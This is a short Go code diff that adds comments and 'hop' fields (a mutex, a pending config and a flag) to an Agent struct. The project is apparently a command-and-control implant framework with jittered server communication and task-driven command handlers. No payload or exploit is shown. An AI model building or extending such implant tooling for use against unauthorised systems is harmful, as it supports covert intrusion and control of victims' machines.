@@ -8,6 +8,7 @@ import (
 	"numinon_shadow/internal/agent/comm"
 	"numinon_shadow/internal/agent/config"
 	"numinon_shadow/internal/models"
+	"sync"
 	"time"
 )
 
@@ -17,10 +18,15 @@ type OrchestratorFunc func(agent *Agent, task models.ServerTaskResponse) models.
 
 // Agent represents an agent instance
 type Agent struct {
-	config       config.AgentConfig
-	communicator comm.Communicator
-	stopChan     chan struct{}
-	rng          *rand.Rand
+	config       config.AgentConfig // config, derived from cmd/builder/agent_config.yaml
+	communicator comm.Communicator  // communicator interface allows for flexible protocol communication implementation
+	stopChan     chan struct{}      // stopChan -> signal agent shutdown
+	rng          *rand.Rand         // rng random number generator for jitter
+
+	// Hop-related fields
+	hopMutex         sync.Mutex          // protects concurrent access to these hop-related fields
+	pendingHopConfig *config.AgentConfig // Stores the new config if a hop is requested
+	requestingHop    bool                // Flag set to true when a hop is requested by a command
 
 	commandOrchestrators map[string]OrchestratorFunc // Maps commands to their keywords
 }
